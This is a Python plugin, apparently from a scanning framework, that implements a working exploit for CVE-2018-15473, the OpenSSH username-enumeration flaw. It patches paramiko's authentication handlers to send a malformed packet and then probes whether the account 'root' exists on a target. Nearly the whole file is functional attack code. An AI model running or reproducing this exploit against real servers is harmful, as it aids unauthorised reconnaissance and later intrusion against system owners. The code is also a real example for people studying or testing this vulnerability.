#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
*----------------*
|CVE-2018-15473  |
*----------------*
Sources:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15473
https://security.netapp.com/advisory/ntap-20181101-0001/
https://www.exploit-db.com/exploits/45233
https://github.com/Rhynorater/CVE-2018-15473-Exploit

"""

import warnings
import paramiko
import core.logger as log
from .IPlugin import IPlugin, connection_type

old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

class BadUsername(Exception):
	def __init__(self):
		pass

def add_boolean(*args, **kwargs):
    pass

def call_error(*args, **kwargs):
    raise BadUsername()

def malform_packet(*args, **kwargs):
	old_add_boolean = paramiko.message.Message.add_boolean
	paramiko.message.Message.add_boolean = add_boolean
	result  = old_parse_service_accept(*args, **kwargs)
	paramiko.message.Message.add_boolean = old_add_boolean
	return result

paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet
paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error

def checkUsername(socket, username, tried=0):
	transport = paramiko.transport.Transport(socket)
	try:
		transport.start_client()
		a = transport.get_banner()
		if a:
			print("BANNER=>", a)
	except paramiko.ssh_exception.SSHException:
		print("EXCEPTION no ", tried)
		transport.close()
		if tried < 3:
			tried += 1
			return checkUsername(socket, username, tried)
		else:
			print ('[-] Failed to negotiate SSH transport')

	try:
		transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
	except BadUsername:
			return (username, False)
	except paramiko.ssh_exception.AuthenticationException:
			return (username, True)
	raise Exception("There was an error. Is this the correct version of OpenSSH?")	
	pass

class Plugin(IPlugin):
	def __init__(self):
		super().__init__()
		self.port = 22
		self.connection_type = connection_type.RAW

	def config(self):
		pass

	def exec(self, socket):
		res = checkUsername(socket, "root")
		if res:
			print("->",res)
		pass
